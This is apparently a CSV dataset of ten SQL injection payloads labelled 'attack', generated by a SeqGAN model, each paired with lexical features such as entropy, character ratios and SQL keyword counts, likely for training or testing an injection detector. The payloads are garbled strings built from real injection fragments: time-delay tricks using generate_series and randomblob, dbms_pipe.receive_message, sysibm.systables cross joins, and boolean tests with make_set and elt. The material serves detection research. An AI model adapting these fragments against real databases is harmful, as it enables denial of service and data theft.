label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%%%%%$--%%$4212hu--%%46""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""% '+  (  select '' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'kpO50000008407""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""$""  =  ""546(""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%%z%%%%$3018%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%kzg3902+11c%%%J(%$z%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'%'qjle'%'  )   and 3202  =  like  (  '%'  )   and 3202  =  like  (  '%'E""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   """"   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%$' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""     I%%%'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'zg(h' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'x7471)   1u%   %%'  )   and 3202  =  like  (  '$%2633'  =  '%%%%%%3018     '   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%%%%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%'  =  '%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%%%B533346@7417""  =  ""46""  =  ""f46q2""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""7471%%%2633",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,0,2084.0,54.0,3.830838103593253,481.0,323.0,909.0,371.0,0.23080614203454894,0.15499040307101727,0.43618042226487524,0.17802303262955854,40.0,28.0,4.0,6.0,9.0,30.0,0.0,156.0,66.0,5.0,12.0,56.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,6.0,0.0,5.0,5.0,29.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,46.0
attack,"1%%%%%$,46f4123c%%%b:[""||c%   m4212uz9643  (* un    (    (     \.l%%oymomuf%v'where8635120%%%2367""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""$'46=kz' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'XM    _pvU%""9688467471b     ""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""_8407u8514.t$tdouon  83   3018 8635%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'zf%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'$3902%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'load_file   %""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%42122367%%%$' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'zf'  )   and 3202  =  like  (  '%2633' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'8407'  =  '%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%'  =  '%""'  =  '%%'  )   and 3202  =  like  (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1,2034.0,55.0,4.104849704420624,590.0,337.0,791.0,316.0,0.29006882989183874,0.16568338249754178,0.3888888888888889,0.1553588987217306,40.0,13.0,0.0,3.0,13.0,31.0,0.0,124.0,41.0,12.0,15.0,58.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,10.0,0.0,9.0,10.0,23.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,53.0
attack,"selectru8407%%%%%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'#""%""R c%%%B""  =  ""'  =  '%'  =  '%z4212u8514%%%%!' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'zfq30182633u%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'40628407'qjle'4212u%%%%%kz' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'46    968811""   )    )     =     (    (   ""W     %46load_filequfvo8407u%%%9%'  =  '5000000550000008635   M%%%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%%'  =  '%%b8635  8635h' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'usrq46:_'  =  ''  =  'qf%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'46' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'g' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'M2633_0""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%""   )    )     =     (    (   ""U    4212'    "" %""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%'  =  '%7417%120or",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,2,2165.0,55.0,4.021304166709476,599.0,368.0,857.0,341.0,0.2766743648960739,0.16997690531177828,0.3958429561200924,0.15750577367205543,47.0,17.0,0.0,3.0,11.0,37.0,0.0,131.0,53.0,14.0,14.0,63.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,12.0,0.0,11.0,11.0,18.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,52.0
attack,"1%%%%%U3595v""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""390267]46ec%%$c%%$cog%p'  =  'i' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'iload_filevmmv%101%%500000000%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'W     J%%%%%%'  =  '%%%'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   '%2633'  =  '%'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   ''  =  '%%3018%%Y4212'  =  'qimvi""vfvh""'  =  '%%%%'  =  '%%2633%%%%%%2633'  =  '%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''  =  '     8407120%%%o 7ou.' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'f46z""  =  ""%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'wherer%%'  )   and 3202  =  like  (  '2367fu8407%'  )   and 3202  =  like  (  '' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'%%%%%""  =  ""8514--%%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%zkzqfM8635%%%%%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,3,1585.0,56.0,4.149661840067533,453.0,256.0,596.0,280.0,0.2858044164037855,0.16151419558359623,0.3760252365930599,0.17665615141955837,44.0,10.0,2.0,1.0,8.0,31.0,0.0,86.0,67.0,8.0,10.0,48.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,8.0,0.0,6.0,7.0,17.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,38.0
attack,"1%%%%%%%%'  )   and 3202  =  like  (  'W'  )   and 3202  =  like  (  'b' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'11(""   )    )    or    (    (   ""x' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'kbwg"" like "" %""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   '2' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,4,737.0,46.0,3.9340943556229986,245.0,85.0,302.0,105.0,0.33242876526458615,0.11533242876526459,0.4097693351424695,0.14246947082767977,14.0,6.0,0.0,1.0,3.0,9.0,0.0,49.0,11.0,2.0,5.0,15.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,2.0,3.0,9.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,19.0
attack,"1%%%%$)   selectc%%%C{f'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   '""  =  ""N'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'y-4212u%   --46%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  """"  =  """"  =  ""546417471hjB)    (upkzg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'7' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'iwherey9688!Y30185333120'ou.%2367||||c%%""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""V4212u' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""N4641jUqiun(hr46533346||)%%u' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""r%%4212' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''  =  '46""  =  ""]]h@q4728'  =  '%%'  =  '%5kzg2633g' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'863574711%%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'i2$(omopun(*uv""  =  ""%o)\.4641q"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""j",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,5,1965.0,62.0,4.174137683531906,562.0,352.0,739.0,312.0,0.2860050890585242,0.17913486005089058,0.37608142493638674,0.15877862595419848,34.0,20.0,3.0,0.0,13.0,37.0,0.0,119.0,25.0,14.0,13.0,77.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,12.0,0.0,11.0,11.0,18.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,52.0
attack,"1%%%%%42125'  =  '%$tbw3902'  )   and make_set  (  4551  =  6487,6487  )   and   (  '4641quombnge(bM    1%   (  c%u.,""  =  ""101%%%%%'  )   and 3202  =  like  (  'u%%%%z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'qfZ' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '-(%%%D%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'XI"" load_file  'u' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'%%%%%$' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""Mqfv%)q%'  )   and make_set  (  4551  =  6487,6487  )   and   (  ''  =  '%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""=j     ~h""%""2633--%%%%%%%%$46""  =  ""8407Qg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'8407""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'R`"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and """"  =  """"  =  ""5333b' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +')5'  =  '%%'50000000030183902%u%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%%$%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z     ",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,6,2333.0,61.0,4.180600583971617,707.0,372.0,873.0,381.0,0.3030432918988427,0.1594513501928847,0.37419631375910845,0.16330904414916417,44.0,23.0,3.0,2.0,13.0,42.0,0.0,137.0,51.0,17.0,20.0,78.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,13.0,0.0,12.0,13.0,25.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,64.0
attack,"1%   4212u%'  =  '%%%%or%%%%%%z%%30188635%'  )   and 3202  =  like  (  ''  )   and 3202  =  like  (  'ufqi2$e(%%%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%$ )%%%%4123%%""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  """"   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""GIg'  =  '%pqim4123%%%%'  =  '%'  =  '%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%4297w^KB""   )    )     =     (    (   ""'  =  '%%""  =  ""m9643500000000%%'  )   and 3202  =  like  (  '4123$120u=%%%%%%'  =  'X' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'4611yH""   )    )     =     (    (   ""' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""B%'  =  '%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%%'  =  '%'  =  '%$%%%%""`4297f%%`5'  =  '46'  =  '%%%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'?""  =  ""533354646f""  =  ""   1%",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,7,1575.0,56.0,3.8492840649893956,349.0,239.0,677.0,310.0,0.22158730158730158,0.15174603174603174,0.42984126984126986,0.19682539682539682,44.0,23.0,0.0,4.0,6.0,34.0,0.0,108.0,67.0,4.0,8.0,48.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,4.0,0.0,4.0,4.0,19.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,32.0
attack,"1%%%%$e120' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'46""  =  ""500000084072633   ""c%%%%%$b' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  """"  =  """"  =  ""tF46%%%%%""   )    )     =     (    (   ""b4641    8635    (    (hrqrp'  =  'fqwhere2633quMh' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""D:oiv_$fer%%f%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'(8407^Mq'""     --%%%$,46f""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%%'  )   and 3202  =  like  (  ''qjle''  =  '%%%2367cm%%MbInnull  (  103u         3018""%46""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  """"   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""uZM46?$'  =  '%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'!"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and """"'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  ']""  =  ""[/	kbUH-,46fq4212",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,8,1641.0,64.0,4.070331166717943,418.0,271.0,667.0,285.0,0.25472273004265694,0.16514320536258378,0.4064594759293114,0.1736745886654479,29.0,26.0,3.0,2.0,9.0,30.0,0.0,105.0,34.0,10.0,12.0,58.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,7.0,0.0,7.0,7.0,17.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,39.0
attack,"1%%%u' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'%%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '39028635%%30187471%$120""  =  ""120%%%%%%	%'  =  '%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'101gpbp11qr%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'G%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'	U""   )    )    or    (    (   ""k:' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''  =  '"" like """,boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,9,1538.0,50.0,4.095123902312024,498.0,255.0,567.0,218.0,0.3237971391417425,0.16579973992197658,0.36866059817945385,0.14174252275682706,28.0,6.0,0.0,0.0,12.0,26.0,0.0,85.0,21.0,11.0,13.0,49.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,12.0,0.0,11.0,12.0,13.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,49.0
